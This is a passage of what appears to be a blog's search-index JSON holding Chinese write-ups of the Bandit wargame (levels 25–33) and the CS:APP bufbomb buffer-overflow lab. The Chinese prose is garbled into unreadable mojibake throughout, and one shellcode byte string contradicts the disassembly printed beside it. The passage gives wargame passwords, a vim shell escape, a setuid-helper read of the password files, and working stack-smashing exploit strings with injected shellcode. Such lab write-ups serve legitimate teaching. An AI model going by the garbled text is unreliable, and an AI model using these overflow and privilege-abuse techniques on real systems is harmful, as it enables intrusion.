text.txtå°±ä¼šç­‰å¾…ç¿»é¡µï¼Œæ˜¾ç„¶ï¼Œtext.txtæ–‡ä»¶å¤ªå°ï¼Œæ­¤æ—¶éœ€è¦å¦è¾Ÿè¹Šå¾„ï¼Œæ—¢ç„¶æ–‡ä»¶æœ¬èº«æ”¹å˜ä¸äº†ï¼Œé‚£ä¹ˆåè¿‡æ¥æ”¹å˜è¿è¡Œçª—å£çš„å¤§å°ä¹Ÿèƒ½èµ·åˆ°åŒæ ·çš„ä½œç”¨ã€‚\nè¿›å…¥moreä»¥åï¼Œä½¿ç”¨vè¿›å…¥vimç¼–è¾‘æ¨¡å¼ï¼Œå†é€šè¿‡\u0026quot;:e /etc/bandit_pass_bandit26\u0026quot;å¾—åˆ°passwordã€‚ï¼ˆ-e æ‰“å¼€æ–‡ä»¶ï¼‰\næˆ–è€…é€šè¿‡:set shell=/bin/bash :shell æ¥è¿›å…¥bandit26ç”¨æˆ·\nlevel26-27 Level Goal\nGood job getting a shell! Now hurry and grab the password for bandit27!\nbandit27.doå·²è¢«setidï¼Œæ‰€ä»¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ—¶ä¼šçŸ­æš‚ä½¿ç”¨rootç”¨æˆ·æƒé™ï¼Œå€Ÿæ­¤æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå…¶å®ƒå‘½ä»¤ã€‚\nbandit26@bandit:~$ ls bandit27-do text.txt bandit26@bandit:~$ ./bandit27-do Run a command as another user. Example: ./bandit27-do id bandit26@bandit:~$ ./bandit27-do cat /etc/bandit\\_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea level27-28 Level Goal\nThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.\nClone the repository and find the password for the next level.\nåœ¨/tmpåˆ›å»ºä¸€ä¸ªç›®å½•ï¼Œæ¥ç€åœ¨ç›®å½•ä¸‹git initï¼Œå†git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repoï¼Œæ³¨æ„ç«¯å£å·ã€‚æœ€åè¯»å–READMEæ–‡ä»¶å³æˆåŠŸ\npasswordï¼šAVanL161y9rsbcJIsFHuw35rjaOM19nR\nlevel28-29 Level Goal\nThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo via the port 2220. The password for the user bandit28-git is the same as for the user bandit28.\nClone the repository and find the password for the next level.\ntipsï¼š\ngit logï¼Œshow us the commit log git show show us the content of a commit (when creating a public repository it is important to be aware of the information you push to it since changes and previous version are saved. So sensitive data, like passwords, could still be retrieved). å…‹éš†è¿œç¨‹ä»“åº“åå‘ç°readme.mdæ–‡ä»¶é‡Œæ²¡æœ‰æ˜¾ç¤ºpasswordï¼Œæ— ä»ä¸‹æ‰‹ï¼Œå‚è€ƒåˆ«äººçš„åšå®¢å‘ç°è¿™ä¸¤ä¸ªå‘½ä»¤ï¼Œäºæ˜¯è¿åˆƒè€Œè§£ã€‚è¿˜æ˜¯å¾—ç§¯ç´¯æ›´å¤šçš„çŸ¥è¯†ã€‚\nlevel29-30 Level Goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo via the port 2220. The password for the user bandit29-git is the same as for the user bandit29.\nClone the repository and find the password for the next level.\nå‚ç…§ä¸Šä¸ªlevelçš„æµç¨‹ï¼Œå‘ç°\nbandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: \u0026lt;no passwords in production!\u0026gt; productionæç¤ºæˆ‘ä»¬æœ‰å…¶å®ƒçš„ç¯å¢ƒ\näºæ˜¯åˆ©ç”¨git branch -aæŸ¥çœ‹æ˜¯å¦æœ‰å…¶å®ƒåˆ†æ”¯ï¼Œå‘ç°devç¯å¢ƒ\nbandit29@bandit:/tmp/bandit29/repo$ git branch -a * master remotes/origin/HEAD -\u0026gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev ä½¿ç”¨git checkout devæˆ–git switch devåˆ‡æ¢åˆ†æ”¯\nbandit29@bandit:/tmp/bandit29/repo$ git checkout remotes/origin/dev Note: switching to \u0026#39;remotes/origin/dev\u0026#39; æœ€åæŸ¥çœ‹ä»“åº“ï¼Œæ‰¾åˆ°å¯†ç \nbandit29@bandit:/tmp/bandit29/repo$ ls code README.md bandit29@bandit:/tmp/bandit29/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS level30-31 Level Goal\nThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo via the port 2220. The password for the user bandit30-git is the same as for the user bandit30.\nClone the repository and find the password for the next level.\nä¸ä¸Šé¢å‡ ä¸ªlevelçš„å·®å¼‚æ˜¯è¿™ä¸ªlevelä½¿ç”¨git tagæ¥è§£å†³\nGit tagging is a way to mark specific points in the history of the repository. One example would be to mark release points of the software. The command to see the tags is git tag. To create a tag the command is git tag -a \u0026lt;tag_name\u0026gt; -m \u0026lt;\u0026quot;tag description/message\u0026quot;\u0026gt;. To see more details, like the tag message and commit, you can use the following command: git show \u0026lt;tag_name\u0026gt;.\nbandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git tag secret bandit30@bandit:/tmp/tmp.GLR635iQNn/repo$ git show secret OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt level31-32 Level Goal\nThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo via the port 2220. The password for the user bandit31-git is the same as for the user bandit31.\nClone the repository and find the password for the next level.\nTips\nGit Commit saves the currently made changes with a message describing these changes. The flag -a makes sure all modified/deleted files are staged.\nGit Push updates local changes in remote repositories. When pushing for the first time, you should also define the branch with -u.\nGit Ignore is a file with the filename â€˜.gitignoreâ€™. In this file, all file names/extensions that should be ignored by the commit are written. This means if a file which is in the ignore file is created/changed, it will not be part of the commit/repository. Git ignore also allows for wildcards. (For example, : â€˜*.pycâ€™ means all files with the ending â€˜.pycâ€™ will be ignored.) There are pre-written files for specific situations and languages, like this one for Python.\nGit Add updates what files will be part of the next commit. The -f flag forces files to be able to be committed, even when they are normally ignored.\n.gitignoreç”¨æ¥è¿‡æ»¤æœ¬åœ°ä»“åº“çš„ä¸€äº›æ–‡ä»¶æˆ–ç›®å½•ï¼Œä½¿å¾—åœ¨ä¸Šä¼ è‡³è¿œç¨‹ä»“åº“æ—¶å¿½ç•¥è¿™äº›æ–‡ä»¶å’Œç›®å½•ï¼Œå…·ä½“ç”¨æ³•STFW\nè§£æ³•ï¼šå…‹éš†è¿œç¨‹ä»“åº“åæŸ¥çœ‹readme.mdæ–‡ä»¶ï¼Œå‘ç°å¦‚ä¸‹æç¤ºï¼ŒæŒ‰ç…§æç¤ºåˆ›å»ºkey.txtæ–‡ä»¶ï¼Œå¹¶æŠŠ\u0026rsquo;May I come in?\u0026lsquo;å†™å…¥ï¼Œæ¥ç€pushåˆ°è¿œç¨‹ä»“åº“ï¼Œå‘ç°æŠ¥é”™ï¼Œäºæ˜¯ä¿®æ”¹.gitignoreçš„æ–‡ä»¶å†…å®¹ä½¿å¾—å…¶èƒ½æ­£å¸¸pushåˆ°è¿œç¨‹ä»“åº“ã€‚\nbandit31@bandit:/tmp/bandit31/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: \u0026#39;May I come in?\u0026#39; Branch: master bandit31@bandit:/tmp/bandit31/repo$ git add . bandit31@bandit:/tmp/bandit31/repo$ git commit -a -m\u0026#34;first\u0026#34; [master 50ed76a] first 2 files changed, 2 insertions(+), 1 deletion(-) create mode 100644 key.txt Enumerating objects: 6, done. Counting objects: 100% (6/6), done. Delta compression using up to 2 threads Compressing objects: 100% (2/2), done. Writing objects: 100% (4/4), 331 bytes | 331.00 KiB/s, done. Total 4 (delta 0), reused 0 (delta 0), pack-reused 0 remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done! Here is the password for the next level: remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost:2220/home/bandit31-git/repo level32-33 After all this git stuff its time for another escape. Good luck!\nTips\nLinux has Variables called local variables (valid in current shell), shell variables (set up by shell) and environment variables (valid systemwide). These variables have their names in uppercase only. They are defined by writing VAR_NAME=var_value in the command line. To see the content of a variable, you can write echo $VAR_NAME.\nTo print all environment variables, you can use printenv.\nSome common that are good to know are:\nTERM - current terminal emulation HOME - the path to home directory of currently logged in user LANG - current locales settings PATH - directory list to be searched when executing commands PWD - pathname of the current working directory SHELL/0 - the path of the current userâ€™s shell USER - currently logged-in user è§£æ³•ï¼šå› ä¸ºshellæŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™äº†ï¼Œæ‰€ä»¥æ— æ³•æ‰§è¡Œæ­£å¸¸çš„æŒ‡ä»¤ï¼Œå¤§å†™çš„å­—ç¬¦ä¸€èˆ¬ä¸ç¯å¢ƒå˜é‡æœ‰å…³ï¼Œ$0è¡¨ç¤ºæ‰€ä½¿ç”¨shellçš„åå­—ï¼Œ$$è¡¨ç¤ºè¿›ç¨‹idï¼Œé€šè¿‡ä½¿ç”¨$0æ¥è¿›å…¥æ­£å¸¸shellï¼Œæ¥ç€è¿›å…¥bandit33æŸ¥çœ‹å¯†ç \n$ exit \u0026gt;\u0026gt; $0 $ whoami bandit33 $ ls uppershell $ cat /etc/bandit_pass/bandit33 odHo63fHiFqcWWJG9rLiLDtPm45KzUKy ","date":"2024-10-06T00:00:00Z","image":"https://chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/1_hu5058548300299695135.jpg","permalink":"https://chenyuan1125.github.io/p/bandit%E5%AE%9E%E9%AA%8C/","title":"banditå®éªŒ"},{"content":"bufferå®éªŒ Level 0: Candle ç›®æ ‡ï¼šæ‰§è¡Œ smoke()ï¼Œè€Œä¸æ˜¯è®© getbuf() è¿”å› 1ã€‚\nvoid test() { int val; /* Put canary on stack to detect possible corruption */ volatile int local = uniqueval(); val = getbuf(); /* Check for corrupted stack */ if (local != uniqueval()) { printf(\u0026#34;Sabotaged!: the stack has been corrupted\\n\u0026#34;); } else if (val == cookie) { printf(\u0026#34;Boom!: getbuf returned 0x%x\\n\u0026#34;, val); validate(3); } else { printf(\u0026#34;Dud: getbuf returned 0x%x\\n\u0026#34;, val); } } åœ¨bufboms.sçš„ç¬¬ 363 è¡Œæ‰¾åˆ°äº† smoke çš„åœ°å€ 08048c18ï¼š\nå†ç ”ç©¶ test çš„éƒ¨åˆ†æ±‡ç¼–ä»£ç ï¼š\n08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; getbuff:\n080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret å¯ä»¥çœ‹åˆ° lea æŠŠ buf çš„æŒ‡é’ˆåœ°å€ (-0x28 (% ebp)) ä¼ ç»™äº† Gets ()ï¼Œ0x28 ä¹Ÿå°±æ˜¯åè¿›åˆ¶çš„ 40 ä¸ªå­—èŠ‚ã€‚è€Œ ebp å äº† 4 ä¸ªå­—èŠ‚ï¼Œbuf è·ç¦» getbuff çš„è¿”å›åœ°å€è¿˜æœ‰ 44 ä¸ªå­—èŠ‚ã€‚\nè¿”å›åœ°å€ éœ€è¦ä¿®æ”¹çš„åœ°å€ ebp - å ç”¨4å­—èŠ‚ \u0026hellip; \u0026hellip; ebp - 40 å­—èŠ‚ buf æ•°ç»„çš„åˆå§‹åœ°å€ \u0026hellip; \u0026hellip; ebp - 0x38 espï¼Œæ ˆå¸§é¦–åœ°å€ ä»æ–‡æ¡£ä¸­å¾—çŸ¥ï¼š\nGets å‡½æ•°ä¸éªŒè¯æ˜¯å¦è¶…å‡ºäº† NORMAL_BUFFER_SIZEï¼Œæ‰€ä»¥è¶…å‡ºå­—ç¬¦çš„å°±ä¼šè¦†ç›–æ‰å†…å­˜ã€‚\né‚£ä¹ˆåªè¦åœ¨ buf å¼€å§‹å¤„éšä¾¿å¡«å…¥ 44 å­—èŠ‚ï¼ˆ0a é™¤å¤–ï¼Œä¼šç»ˆæ­¢è¾“å…¥ï¼‰ï¼Œç„¶ååœ¨åé¢åŠ å…¥ smoke çš„åœ°å€ï¼Œè¦†ç›–æ‰æ ˆä¸­çš„è¿”å›åœ°å€å³å¯ã€‚\nå¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ x86 æœºå™¨ä¸ºå°ç«¯æ³•æœºå™¨ï¼Œæœ€ä½æœ‰æ•ˆå­—èŠ‚åœ¨å†…å­˜çš„å‰é¢ï¼Œæ‰€ä»¥åœ¨ exploit.txt ä¸­å¡«å…¥å¦‚ä¸‹ç­”æ¡ˆå³å¯ï¼š\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08 level 1ï¼šSparker ç›®æ ‡ï¼šè°ƒç”¨fizzå‡½æ•°ï¼Œå¹¶ä¸”é€šè¿‡ä¼ é€’è‡ªå·±çš„cookieå€¼ä½œä¸ºå‚æ•°ï¼Œä»¥æ­¤æ¥é€šè¿‡éªŒè¯\n08048c42 \u0026lt;fizz\u0026gt;: 8048c42:\t55 push %ebp 8048c43:\t89 e5 mov %esp,%ebp 8048c45:\t83 ec 18 sub $0x18,%esp 8048c48:\t8b 45 08 mov 0x8(%ebp),%eax 8048c4b:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048c51:\t75 26 jne 8048c79 \u0026lt;fizz+0x37\u0026gt; 8048c53:\t89 44 24 08 mov %eax,0x8(%esp) 8048c57:\tc7 44 24 04 ee a4 04 movl $0x804a4ee,0x4(%esp) 8048c5e:\t08 8048c5f:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c66:\te8 55 fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c6b:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c72:\te8 04 07 00 00 call 804937b \u0026lt;validate\u0026gt; 8048c77:\teb 18 jmp 8048c91 \u0026lt;fizz+0x4f\u0026gt; 8048c79:\t89 44 24 08 mov %eax,0x8(%esp) 8048c7d:\tc7 44 24 04 40 a3 04 movl $0x804a340,0x4(%esp) 8048c84:\t08 8048c85:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048c8c:\te8 2f fd ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048c91:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048c98:\te8 63 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; æ ˆç»“æ„ç¤ºæ„å›¾ï¼š\nåœ°å€ è§£é‡Š ebp + 8 å­—èŠ‚ val è¿”å›åœ°å€ åº”å½“ä¸º fizz çš„é¦–åœ°å€ ebp å 4å­—èŠ‚ \u0026hellip; \u0026hellip; ebp-40å­—èŠ‚ bufæ•°ç»„çš„åˆå§‹åœ°å€ åŒæ ·æ˜¯åœ¨bufä¸­æ’å…¥cookieå€¼ï¼Œæ³¨æ„å‡½æ•°å‚æ•°åœ¨å‡½æ•°è¿”å›åœ°å€ä¹‹å‰ï¼Œæ‰€ä»¥ï¼Œcookieå€¼åº”è¯¥æ’å…¥åœ¨ebp+8èµ·å§‹çš„å…«ä¸ªå­—èŠ‚ä¸­ï¼Œæ‰€ä»¥åœ¨ exploit.txt ä¸­å¡«å…¥å¦‚ä¸‹ç­”æ¡ˆå³å¯ï¼š\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 86 07 ce 2b level2ï¼šFirecracker ç›®æ ‡ï¼šè°ƒç”¨bangå‡½æ•°ï¼Œå¹¶ä¸”ä¿®æ”¹global_valueä¸ºè‡ªå·±çš„cookieå€¼\n08048c9d \u0026lt;bang\u0026gt;: 8048c9d:\t55 push %ebp 8048c9e:\t89 e5 mov %esp,%ebp 8048ca0:\t83 ec 18 sub $0x18,%esp 8048ca3:\ta1 00 d1 04 08 mov 0x804d100,%eax 8048ca8:\t3b 05 08 d1 04 08 cmp 0x804d108,%eax 8048cae:\t75 26 jne 8048cd6 \u0026lt;bang+0x39\u0026gt; 8048cb0:\t89 44 24 08 mov %eax,0x8(%esp) 8048cb4:\tc7 44 24 04 60 a3 04 movl $0x804a360,0x4(%esp) 8048cbb:\t08 8048cbc:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048cc3:\te8 f8 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cc8:\tc7 04 24 02 00 00 00 movl $0x2,(%esp) 8048ccf:\te8 a7 06 00 00 call 804937b \u0026lt;validate\u0026gt; 8048cd4:\teb 18 jmp 8048cee \u0026lt;bang+0x51\u0026gt; 8048cd6:\t89 44 24 08 mov %eax,0x8(%esp) 8048cda:\tc7 44 24 04 0c a5 04 movl $0x804a50c,0x4(%esp) 8048ce1:\t08 8048ce2:\tc7 04 24 01 00 00 00 movl $0x1,(%esp) 8048ce9:\te8 d2 fc ff ff call 80489c0 \u0026lt;__printf_chk@plt\u0026gt; 8048cee:\tc7 04 24 00 00 00 00 movl $0x0,(%esp) 8048cf5:\te8 06 fc ff ff call 8048900 \u0026lt;exit@plt\u0026gt; å·²çŸ¥å˜é‡çš„å†…å­˜åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ’å…¥æ¶æ„ä»£ç æ¥ä¿®æ”¹å˜é‡çš„å€¼ï¼Œæ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š\n# æ”¹å˜ global_value movl $0x2bce0786,0x804d100 # å°† bang å‡½æ•°çš„é¦–åœ°å€å‹å…¥æ ˆ pushl $0x08048c9d ret æ¥ä¸‹æ¥å°±æ˜¯å°†æ±‡ç¼–è¯­è¨€è½¬æ¢æˆåå…­è¿›åˆ¶çš„æœºå™¨ä»£ç äº†ã€‚ä½¿ç”¨gcc -m32 -c å’Œ objdump -då¯ä»¥å¾—åˆ°è½¬æ¢ä¹‹åçš„æ–‡ä»¶ï¼š\n00000000 \u0026lt;.text\u0026gt;: 0:\tc7 05 00 d1 04 08 86 movl $0x2bce0786,0x804d100 7:\t07 ce 2b a:\t68 9d 8c 04 08 push $0x8048c9d f:\tc3 ret é‚£ä¹ˆæ‰€æœ‰çš„å­—èŠ‚å°±æ˜¯ c7 05 00 d1 04 08 70 5a 2d 36 68 9d 8c 04 08 c3ã€‚æ¥ä¸‹æ¥å›åˆ° getbuff çš„æ±‡ç¼–ä»£ç ï¼š\n080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret æ„é€ æ ˆçš„ç»“æ„ï¼š\nåœ°å€ è§£é‡Š 0x55683e78 å…¥ä¾µä»£ç çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨getå‡½æ•°å‰eaxå¯„å­˜å™¨çš„å€¼ ebp \u0026hellip; ret push $0x08048c9d 0x08048c9dä¸ºbangå‡½æ•°çš„èµ·å§‹åœ°å€ movl $0x2bce0786,0x804d100 0x804d100ä¸ºglobal_valueå˜é‡çš„å†…å­˜åœ°å€ï¼Œ0x2bce0786ä¸ºhackå¯¹åº”çš„cookieå€¼,å½“å‰åœ°å€ä¸ºbufæ•°ç»„çš„åˆå§‹åœ°å€ rsp-40å­—èŠ‚ ç»“åˆä»¥ä¸Šä¿¡æ¯ï¼Œæ„é€ ä¸‹åˆ—ç­”æ¡ˆï¼š\nc7 05 00 d1 04 08 86 07 ce 2b 68 9d 8c 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 3e 68 55 è¿è¡Œç»“æœå¦‚ä¸‹ï¼š\nlevel3ï¼š Dynamite ç›®æ ‡ï¼šæ³¨å…¥ä¸€æ®µèƒ½å¤Ÿä¿®æ”¹ getbuf è¿”å›å€¼çš„ä»£ç ï¼Œè¿”å›å€¼ä» 1 æ”¹æˆ cookie å€¼ï¼Œæ­¤å¤–è¿˜éœ€è¦è¿˜åŸæ‰€æœ‰ç ´åï¼Œç»§ç»­è¿è¡Œ test çš„å‰©ä¸‹éƒ¨åˆ†ï¼Œæ³¨æ„getbufå‡½æ•°å¼€å¤´çš„push %ebpã€‚\nåŒæ ·å›åˆ° getbuff çš„æ±‡ç¼–ä»£ç ï¼š\n080491f4 \u0026lt;getbuf\u0026gt;: 80491f4:\t55 push %ebp 80491f5:\t89 e5 mov %esp,%ebp 80491f7:\t83 ec 38 sub $0x38,%esp 80491fa:\t8d 45 d8 lea -0x28(%ebp),%eax 80491fd:\t89 04 24 mov %eax,(%esp) 8049200:\te8 f5 fa ff ff call 8048cfa \u0026lt;Gets\u0026gt; 8049205:\tb8 01 00 00 00 mov $0x1,%eax 804920a:\tc9 leave 804920b:\tc3 ret æ³¨æ„åˆ°è°ƒç”¨Getså‡½æ•°åï¼Œä¼šå°†eaxå¯„å­˜å™¨ç½®1ï¼Œäºæ˜¯æˆ‘ä»¬éœ€è¦è·³è¿‡è¿™æ¡å‘½ä»¤ï¼Œå†ä¿®æ”¹eaxå¯„å­˜å™¨çš„å€¼ï¼Œæœ€åè¿”å›åˆ°è°ƒç”¨getbufå‡½æ•°çš„ä¸‹ä¸€æ¡å‘½ä»¤ï¼Œä¸èƒ½å›åˆ°getbufå‡½æ•°çš„leaveå‘½ä»¤ï¼Œå› ä¸ºè¿”å›testå‡½æ•°çš„åœ°å€å·²ç»æ²¡äº†ï¼Œå¦‚æœè¿”å›åˆ°getbufå‡½æ•°çš„leaveå‘½ä»¤ï¼Œé‚£ä¹ˆè¿˜éœ€åœ¨retåé¢æ·»åŠ testå‡½æ•°çš„è¿”å›åœ°å€ã€‚\nç»“åˆ test çš„å‰å‡ è¡Œä»£ç ï¼š\n08048daa \u0026lt;test\u0026gt;: 8048daa:\t55 push %ebp 8048dab:\t89 e5 mov %esp,%ebp 8048dad:\t53 push %ebx 8048dae:\t83 ec 24 sub $0x24,%esp 8048db1:\te8 da ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; 8048db6:\t89 45 f4 mov %eax,-0xc(%ebp) 8048db9:\te8 36 04 00 00 call 80491f4 \u0026lt;getbuf\u0026gt; 8048dbe:\t89 c3 mov %eax,%ebx 8048dc0:\te8 cb ff ff ff call 8048d90 \u0026lt;uniqueval\u0026gt; æ‰€ä»¥åº”å½“æ„é€  Gets çš„æ ˆå¸§å¦‚ä¸‹ï¼š\nåœ°å€ è§£é‡Š è¿”å›åœ°å€ è®¾ç½®æˆç¼“å†²åŒºçš„é¦–åœ°å€ ebp å ç”¨4å­—èŠ‚ \u0026hellip; \u0026hellip; ebp - 40 å­—èŠ‚ buf æ•°ç»„çš„åˆå§‹åœ°å€ï¼Œä»è¿™é‡Œå¼€å§‹æ³¨å…¥ä¿®æ”¹ eax çš„ä»£ç  \u0026hellip; \u0026hellip; ebp - 0x38 espï¼Œæ ˆå¸§é¦–åœ°å€ æ„é€ çš„æ±‡ç¼–å‘½ä»¤å¦‚ä¸‹ï¼š\n00000000 \u0026lt;.text\u0026gt;: 0:\tb8 86 07 ce 2b mov $0x2bce0786,%eax 5:\t68 0a 92 04 08 push $0x804920a a:\tc3 ret ä¸ºäº†é˜²æ­¢å¯¹æ ˆçš„ç ´åï¼Œebp æ˜¯è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨ï¼Œæ˜¯ test åœ¨è°ƒç”¨ getbuf ä¹‹åï¼Œgetbuf é¦–å…ˆå°±å°±å‹è¿›äº†æ ˆå¸§é‡Œã€‚åŒæ—¶ä¸ºäº†ä½¿ç¨‹åºç»§ç»­è¿è¡Œï¼Œéœ€è¦ä¿è¯ ebp ä¸è¢«ç ´åã€‚ä½¿ç”¨ gdbï¼Œåœ¨ getbuf çš„ç¬¬ä¸€è¡Œ 0x080491f4 å¤„æ‰“ä¸‹æ–­ç‚¹ï¼Œç ”ç©¶æ­¤æ—¶ebp çš„å€¼ï¼Œebpçš„å€¼ä¸º0x55683ed0ã€‚\næ‰€ä»¥æ„é€ çš„ç­”æ¡ˆä¸ºï¼š\nb8 86 07 ce 2b 68 be 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d0 3e 68 55 78 3e 68 55 æœ€åçš„è¿è¡Œç»“æœä¸ºï¼š\nlevel4ï¼šNitroglycerinï¼ˆè¿™ä¸ªå®éªŒçš„è§£é¢˜æ€è·¯æœ‰ç‚¹æ²¡æœ‰ç†è§£ï¼‰ ç›®æ ‡ï¼šä½¿ç”¨-nå‚æ•°è¿›å…¥è¯¥å®éªŒï¼Œè¯¥å®éªŒä¼šè¿ç»­è°ƒç”¨5æ¬¡getbufnï¼Œè¦æ±‚æˆ‘ä»¬æ¯æ¬¡åœ¨è°ƒç”¨getbufnå‡½æ•°åè¿”å›cookieå€¼ï¼Œè€Œä¸æ˜¯1ï¼ŒåŒæ—¶è¿˜éœ€æ¢å¤æ‰€æœ‰ç ´åã€‚\nå’Œå‰é¢ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€ä¸ªé˜¶æ®µç”±äºä½¿ç”¨çš„æ˜¯ getbufn å’Œ testn å‡½æ•°ï¼Œå¹¶ä¸”éœ€è¦å°†ä¸€ä¸ªç›¸åŒçš„å­—ç¬¦ä¸²è¾“å…¥äº”æ¬¡ã€‚æ‰€ä»¥éœ€è¦ä½¿ç”¨å‘½ä»¤-n\nåŒæ—¶ï¼Œæ–‡æ¡£ä¹ŸæŒ‡å‡ºåœ¨ getbufn ä¸­æœ‰#define KABOOM_BUFFER_SIZE 512ï¼Œæ‰€ä»¥ç¼“å†²åŒºå¤§å°ä¸º 512.\nè¿™æ¬¡ç ”ç©¶ getbufn çš„æ±‡ç¼–ä»£ç ï¼š\n(gdb) disas Dump of assembler code for function getbufn: 0x0804920c \u0026lt;+0\u0026gt;:\tpush %ebp 0x0804920d \u0026lt;+1\u0026gt;:\tmov %esp,%ebp # esp å‡å»äº† 536 ä¸ªå­—èŠ‚ 0x0804920f \u0026lt;+3\u0026gt;:\tsub $0x218,%esp # buf çš„é¦–åœ°å€ç©ºé—´ç¦» ebp æœ‰ 520 ä¸ªå­—èŠ‚ =\u0026gt; 0x08049215 \u0026lt;+9\u0026gt;:\tlea -0x208(%ebp),%eax 0x0804921b \u0026lt;+15\u0026gt;:\tmov %eax,(%esp) 0x0804921e \u0026lt;+18\u0026gt;:\tcall 0x8048cfa \u0026lt;Gets\u0026gt; 0x08049223 \u0026lt;+23\u0026gt;:\tmov $0x1,%eax 0x08049228 \u0026lt;+28\u0026gt;:\tleave 0x08049229 \u0026lt;+29\u0026gt;:\tret End of assembler dump. åœ¨è¿™ä¸€é˜¶æ®µï¼Œgetbufn ä¼šè°ƒç”¨ 5 æ¬¡ï¼Œæ¯æ¬¡çš„å‚¨å­˜çš„ ebp éƒ½ä¸ä¸€æ ·ï¼Œå®˜æ–¹æ–‡æ¡£è¡¨ç¤ºè¿™ä¸ªå·®å€¼ä¼šåœ¨ +- 240 çš„æ ·å­ï¼š\næ¥ä¸‹æ¥ä½¿ç”¨ gdbï¼Œåœ¨ getbufn æ‰“ä¸‹æ–­ç‚¹ï¼Œè¿ç»­ 5 æ¬¡æŸ¥çœ‹ % ebp çš„å€¼ï¼Œå¯ä»¥å¾—åˆ°è¿™äº”æ¬¡ ebp çš„å€¼åˆ†åˆ«æ˜¯åœ¨ï¼š\nNo p/x $ebp p/x $ebp - 0x208 1 0x55683110 0x55682f08 2 0x556830b0 0x55682ea8 3 0x55683100 0x55682ef8 4 0x55683110 0x55682f08 5 0x55683180 0x55682f78 å¯¹åº”çš„ï¼Œbuf çš„èµ·å§‹åœ°å€å°±æ˜¯æ¯ä¸€æ¬¡è®°çš„ ebp å‡å» 208ï¼Œä¹Ÿå°±æ˜¯ 520 å­—èŠ‚ã€‚\næ‰€ä»¥æ¯ä¸€æ¬¡çš„åœ°å€æ˜¯æ— 